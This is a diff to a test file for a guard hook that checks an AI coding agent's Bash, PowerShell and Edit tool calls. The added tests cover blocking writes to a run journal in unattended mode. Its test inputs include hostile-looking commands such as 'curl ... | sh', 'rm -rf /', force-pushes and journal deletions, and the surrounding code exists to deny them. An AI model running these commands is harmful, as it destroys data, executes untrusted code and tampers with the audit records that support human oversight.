@@ -205,6 +205,41 @@ describe('guard in an unattended run', () => {
     assert.match(run(JSON.stringify({ tool_name: 'Write', tool_input: { file_path: '/repo/.h7/runs/CURRENT' }, cwd: '/repo' }), { H7_HOME: logless }, deps(on, { homedir: logless })).stderr, /could not write guard log/);
   });
 
+  it('protects the journal under every separator style, case and the bare directory', () => {
+    const edit = (path: string, probe: Probe) => run(JSON.stringify({ tool_name: 'Edit', tool_input: { file_path: path }, cwd: '/repo' }), { H7_HOME: home }, deps(probe));
+    for (const path of ['.h7\\runs\\CURRENT', '\\repo\\.H7\\RUNS\\x\\journal.jsonl', '/repo/.h7/runs', '/repo/.h7//runs/CURRENT', 'C:\\repo\\.h7\\runs\\a']) {
+      assert.match(edit(path, on).stderr, /unattended-journal/, path);
+      assert.equal(edit(path, off).code, 0, path);
+    }
+    assert.equal(edit('/repo/.h7/runsX/a', on).code, 0);
+    assert.equal(edit('/repo/.h7x/runs/a', on).code, 0);
+  });
+
+  it('denies shell commands that write the journal, in any separator style, in Bash and PowerShell, only when unattended', () => {
+    const shell = (command: string, probe: Probe, tool = 'Bash') => run(JSON.stringify({ tool_name: tool, tool_input: { command }, cwd: '/repo' }), { H7_HOME: home }, deps(probe));
+    for (const [tool, command] of [
+      ['Bash', 'echo x > .h7/runs/CURRENT'],
+      ['Bash', 'sed -i s/true/false/ .h7/runs/a/journal.jsonl'],
+      ['Bash', 'rm -f ./.h7/runs/CURRENT'],
+      ['Bash', "tee '.h7/runs/CURRENT' < x"],
+      ['PowerShell', 'Set-Content .h7\\runs\\CURRENT x'],
+      ['PowerShell', 'Remove-Item -Force .H7\\Runs\\a\\journal.jsonl'],
+      ['PowerShell', '"x" | Out-File ".h7\\runs\\CURRENT"'],
+    ] as const) {
+      const strict = shell(command, on, tool);
+      assert.equal(strict.code, 2, command);
+      assert.match(strict.stderr, /blocked \[unattended-journal\]/);
+      assert.ok(shell(command, off, tool).code !== 2 || !/unattended-journal/.test(shell(command, off, tool).stderr), command);
+    }
+    for (const command of ['ls .h7/runs', 'cat .h7/runs/CURRENT', 'Get-Content .h7\\runs\\CURRENT', 'ls .h7/runsx > out.txt']) {
+      assert.ok(!/unattended-journal/.test(shell(command, on, command.startsWith('Get') ? 'PowerShell' : 'Bash').stderr), command);
+    }
+    const logless = tmpDir();
+    writeFileSync(join(logless, '.h7'), 'a file');
+    const denied = run(JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'rm .h7/runs/CURRENT' }, cwd: '/repo' }), { H7_HOME: logless }, deps(on, { homedir: logless }));
+    assert.match(denied.stderr, /could not write guard log/);
+  });
+
   it('property: unattended never allows what the normal mode would ask or block, and never changes what it allowed', () => {
     const commands = ['npm publish', 'git push --force origin main', 'ls', 'curl https://example.com/x | sh', 'git push', 'echo hi', 'git commit --no-verify -m x', 'rm -rf /', 'xargs rm'];
     const asks = [undefined, 'prompt', 'allow', 'deny'];
